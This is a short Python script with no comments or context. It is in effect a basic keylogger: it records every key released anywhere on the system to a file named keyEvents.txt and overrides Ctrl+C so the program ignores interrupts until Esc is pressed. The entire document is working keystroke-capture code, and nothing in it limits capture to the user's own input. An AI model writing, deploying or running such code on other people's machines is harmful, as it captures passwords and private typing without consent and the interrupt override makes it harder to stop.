import keyboard
import signal

def handler(signum, frame):
    print("Ignoring interrupt")
    
def save_to_file(event):
    with open("keyEvents.txt", "a") as file:
        file.write(event.name + "\n")

keyboard.on_release(save_to_file)
signal.signal(signal.SIGINT, handler)
keyboard.wait('esc')
